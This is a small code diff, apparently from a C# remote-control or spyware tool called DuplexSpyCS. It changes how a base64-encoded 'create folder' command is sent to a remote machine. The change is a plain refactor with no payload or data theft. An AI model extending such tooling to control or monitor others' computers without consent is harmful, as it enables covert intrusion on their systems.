@@ -48,7 +48,7 @@ namespace DuplexSpyCS
 
             if (radioButton1.Checked) //FOLDER
             {
-                v.encSend(2, 0, "file|new|folder|" + clsCrypto.b64E2Str(Path.Combine(dir, name)));
+                v.fnSendCommand("file|new|folder|" + clsCrypto.b64E2Str(Path.Combine(dir, name)));
             }
             else //FILE
             {
